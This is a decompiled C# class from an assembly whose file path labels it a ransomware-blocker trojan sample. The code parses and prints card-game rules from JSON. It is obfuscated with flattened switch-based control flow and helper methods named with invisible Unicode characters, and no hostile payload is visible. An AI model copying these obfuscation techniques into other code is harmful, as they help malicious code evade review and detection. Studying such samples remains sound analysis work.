// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: StreamWriterBufferedDataLo, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 2A001E45-B149-45C2-9BBE-A5BA299DBD32
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-375dd437fa652b84e37aabfc7547012047b9c468f5470c4761424ed1086c52a4.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
label_1:
      int num1 = 1501803430;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 317199733)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1247758597 ^ -1934292764;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public static Rules Deserialize(JSONNode json)
    {
      int asInt = json["max-impact"].AsInt;
label_1:
      int num1 = -378752103;
      Rules rules;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1039405170)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -519716145 ^ 1698636223;
            continue;
          case 3:
            rules = new Rules()
            {
              SprintCount = json["sprints"].AsInt,
              MaxImpact = asInt,
              Cards = Rules.ParseDeck(json["deck"], asInt),
              InitialResources = json["initial-resources"].AsInt,
              NormalPlanningCount = json["normal-planning-count"].AsInt,
              NormalPlanningCost = json["normal-planning-cost"].AsInt,
              OverPlanningCost = json["over-planning-cost"].AsInt,
              SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
              RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
              EconomicsAffectsAll = json["economics-affects-all"].AsBool,
              StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
              OnlyOneWinner = json["only-one-winner"].AsBool
            };
            num1 = (int) num2 * 854502139 ^ -57129822;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return rules;
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
      float[] numArray = new float[json.Count];
      int aIndex = 0;
label_5:
      bool flag = aIndex < numArray.Length;
      int num1 = 1607470581;
      float[] riskChances;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 829232991)) % 7U)
        {
          case 0:
            num1 = (int) num2 * 2123546450 ^ 1927258839;
            continue;
          case 1:
            riskChances = numArray;
            num1 = (int) num2 * -1424252212 ^ 1939816175;
            continue;
          case 2:
            num1 = 1711107738;
            continue;
          case 3:
            numArray[aIndex] = json[aIndex].AsFloat;
            ++aIndex;
            num1 = 1660189907;
            continue;
          case 5:
            goto label_5;
          case 6:
            int num3 = !flag ? -1603455457 : (num3 = -815201946);
            num1 = num3 ^ (int) num2 * 1141327878;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
label_1:
      int num1 = 1080257667;
      bool flag1;
      List<Card> cardList;
      int aIndex1;
      bool flag2;
      int count;
      int num2;
      int aIndex2;
      bool flag3;
      JSONNode jsonNode;
      Card[] array;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 1814530601)) % 21U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num3 * 258522382 ^ -1540282829;
            continue;
          case 2:
            ++aIndex1;
            num1 = (int) num3 * 1521348795 ^ 312835445;
            continue;
          case 3:
            num1 = (int) num3 * -1634013100 ^ -1667716266;
            continue;
          case 4:
            int num4;
            num1 = num4 = num2 >= jsonNode[aIndex2].AsInt ? 796633742 : (num4 = 1586529072);
            continue;
          case 5:
            cardList = new List<Card>();
            aIndex1 = 0;
            num1 = (int) num3 * -1266116066 ^ -1527265055;
            continue;
          case 6:
            flag2 = aIndex2 < maxImpact * 2;
            num1 = 1571500501;
            continue;
          case 7:
            ++aIndex2;
            num1 = (int) num3 * 949568930 ^ -824336139;
            continue;
          case 8:
            aIndex2 = 0;
            num1 = (int) num3 * -1024359490 ^ -1205567851;
            continue;
          case 10:
            num2 = 0;
            num1 = 1603741687;
            continue;
          case 11:
            int num5 = flag1 ? 514891323 : (num5 = 1186704690);
            num1 = num5 ^ (int) num3 * 1334641188;
            continue;
          case 12:
            array = cardList.ToArray();
            num1 = (int) num3 * -449587002 ^ 1772670457;
            continue;
          case 13:
            int num6 = flag2 ? 1749198232 : (num6 = 1913028057);
            num1 = num6 ^ (int) num3 * 141706122;
            continue;
          case 14:
            num1 = (int) num3 * 361478313 ^ -1623369451;
            continue;
          case 15:
            flag3 = aIndex2 < maxImpact;
            num1 = 2108881879;
            continue;
          case 16:
            ++num2;
            num1 = (int) num3 * 1097501062 ^ 1303763157;
            continue;
          case 17:
            count = json.Count;
            num1 = (int) num3 * -511117556 ^ -1793953125;
            continue;
          case 18:
            jsonNode = json[aIndex1];
            num1 = 1413853606;
            continue;
          case 19:
            flag1 = aIndex1 < count;
            num1 = 121055001;
            continue;
          case 20:
            cardList.Add(new Card()
            {
              Impact = flag3 ? -(maxImpact - aIndex2) : maxImpact * 2 - aIndex2,
              Type = aIndex1
            });
            num1 = 1577310912;
            continue;
          default:
            goto label_22;
        }
      }
label_22:
      return array;
    }

    public override string ToString()
    {
label_1:
      int num1 = 273628659;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1301490878)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            str = Rules.\u206F‬⁯⁮⁮⁬‬‭⁫‍‌‮‏⁫‮⁫⁪‍⁬‮⁮‍‍⁮⁪⁫‮⁯​⁮⁮‎⁯‌⁫‭⁭⁯‫‌‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
            {
              (object) this.SprintCount,
              (object) this.MaxImpact,
              (object) this.CardsToString(),
              (object) this.InitialResources,
              (object) this.NormalPlanningCount,
              (object) this.NormalPlanningCost,
              (object) this.OverPlanningCost,
              (object) this.SprintsWonWithoutPlanning,
              (object) this.RiskChancesToString(),
              (object) this.EconomicsAffectsAll,
              (object) this.StayOnSprintMinDiff,
              (object) this.OnlyOneWinner
            });
            num1 = (int) num2 * -486591693 ^ -1424030337;
            continue;
          case 2:
            num1 = (int) num2 * -303877083 ^ -460407281;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    private string CardsToString()
    {
label_1:
      int num1 = -1602942717;
      Card[] cards;
      string str1;
      Card card1;
      int num2;
      string str2;
      int index;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -791356361)) % 18U)
        {
          case 0:
            int num4;
            num1 = num4 = index < cards.Length ? -1669514510 : (num4 = -973093624);
            continue;
          case 1:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u206C⁫‎⁮⁫⁯‏‎⁭‏⁮⁮⁫‮‬⁬‏⁯⁭⁫‎‪‫⁪‪‪‮​‎⁪‮‮‍‭‬‎⁫‎⁪‌‮((object) card2) : (string) null;
            str1 = Rules.\u202C‎‪​‏‌‬‎‮‭‎‭‪‏‬‎‍⁮⁬⁫‭‫‬⁫‌⁯​⁫‌‬⁪‪‏‏⁮‪⁮​‌‌‮(str3, str4, " ");
            num1 = -1870836634;
            continue;
          case 2:
            num1 = (int) num3 * -1063910607 ^ -643794153;
            continue;
          case 3:
            str1 = Rules.\u200D​⁯‮‎⁫‫⁪⁮⁭​​​⁬⁭⁯‬‏⁭‮⁪⁯‌‪​‪⁪⁯‪⁮‏‏‬‭‪‮‮⁪⁯‬‮(str1, "\n\t");
            num2 = card1.Type;
            num1 = (int) num3 * 509451268 ^ 1517879873;
            continue;
          case 4:
            index = 0;
            num1 = (int) num3 * -1715065554 ^ 2018938607;
            continue;
          case 5:
            ++index;
            num1 = (int) num3 * 61030013 ^ -532030956;
            continue;
          case 6:
            num1 = (int) num3 * -65859137 ^ -210144328;
            continue;
          case 7:
            int num5 = num2 == card1.Type ? 1469596318 : (num5 = 935334176);
            num1 = num5 ^ (int) num3 * -1087122188;
            continue;
          case 9:
            card1 = cards[index];
            num1 = -1150010257;
            continue;
          case 10:
            str1 = "[\n\t";
            num1 = (int) num3 * 828409464 ^ -1471990672;
            continue;
          case 11:
            goto label_1;
          case 12:
            cards = this.Cards;
            num1 = (int) num3 * -680389680 ^ -417666213;
            continue;
          case 13:
            num1 = (int) num3 * 1587575207 ^ 386012083;
            continue;
          case 14:
            num1 = (int) num3 * 1144978764 ^ -1227994390;
            continue;
          case 15:
            num2 = 0;
            num1 = (int) num3 * -2101804282 ^ -442944889;
            continue;
          case 16:
            num1 = (int) num3 * -979701664 ^ 1149797785;
            continue;
          case 17:
            str2 = Rules.\u200D​⁯‮‎⁫‫⁪⁮⁭​​​⁬⁭⁯‬‏⁭‮⁪⁯‌‪​‪⁪⁯‪⁮‏‏‬‭‪‮‮⁪⁯‬‮(str1, "\n]");
            num1 = (int) num3 * 214671537 ^ 599002526;
            continue;
          default:
            goto label_19;
        }
      }
label_19:
      return str2;
    }

    private string RiskChancesToString()
    {
label_1:
      int num1 = -1458074492;
      int index;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -821306137)) % 6U)
        {
          case 1:
            int num3;
            num1 = num3 = index < this.RiskChances.Length ? -980892737 : (num3 = -25298801);
            continue;
          case 2:
            str1 = Rules.\u202C‎‪​‏‌‬‎‮‭‎‭‪‏‬‎‍⁮⁬⁫‭‫‬⁫‌⁯​⁫‌‬⁪‪‏‏⁮‪⁮​‌‌‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u206B⁫⁭​‍⁬‮‬‮⁬‎⁮⁭‏⁮⁪⁮‎⁮⁭⁬⁭‬⁫‌⁬‪‫‬⁯⁫‭⁯‏⁭‍⁮‏⁭⁪‮()));
            ++index;
            num1 = -454718814;
            continue;
          case 3:
            str1 = Rules.\u200D​⁯‮‎⁫‫⁪⁮⁭​​​⁬⁭⁯‬‏⁭‮⁪⁯‌‪​‪⁪⁯‪⁮‏‏‬‭‪‮‮⁪⁯‬‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u206B⁫⁭​‍⁬‮‬‮⁬‎⁮⁭‏⁮⁪⁮‎⁮⁭⁬⁭‬⁫‌⁬‪‫‬⁯⁫‭⁯‏⁭‍⁮‏⁭⁪‮()));
            index = 1;
            num1 = (int) num2 * -1983204680 ^ -1715923062;
            continue;
          case 4:
            str2 = Rules.\u200D​⁯‮‎⁫‫⁪⁮⁭​​​⁬⁭⁯‬‏⁭‮⁪⁯‌‪​‪⁪⁯‪⁮‏‏‬‭‪‮‮⁪⁯‬‮(str1, " ]");
            num1 = (int) num2 * -1966227371 ^ -1738413827;
            continue;
          case 5:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_7:
      return str2;
    }

    static string \u206F‬⁯⁮⁮⁬‬‭⁫‍‌‮‏⁫‮⁫⁪‍⁬‮⁮‍‍⁮⁪⁫‮⁯​⁮⁮‎⁯‌⁫‭⁭⁯‫‌‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u200D​⁯‮‎⁫‫⁪⁮⁭​​​⁬⁭⁯‬‏⁭‮⁪⁯‌‪​‪⁪⁯‪⁮‏‏‬‭‪‮‮⁪⁯‬‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u206C⁫‎⁮⁫⁯‏‎⁭‏⁮⁮⁫‮‬⁬‏⁯⁭⁫‎‪‫⁪‪‪‮​‎⁪‮‮‍‭‬‎⁫‎⁪‌‮([In] object obj0) => obj0.ToString();

    static string \u202C‎‪​‏‌‬‎‮‭‎‭‪‏‬‎‍⁮⁬⁫‭‫‬⁫‌⁯​⁫‌‬⁪‪‏‏⁮‪⁮​‌‌‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u206B⁫⁭​‍⁬‮‬‮⁬‎⁮⁭‏⁮⁪⁮‎⁮⁭⁬⁭‬⁫‌⁬‪‫‬⁯⁫‭⁯‏⁭‍⁮‏⁭⁪‮() => CultureInfo.InvariantCulture;
  }
}
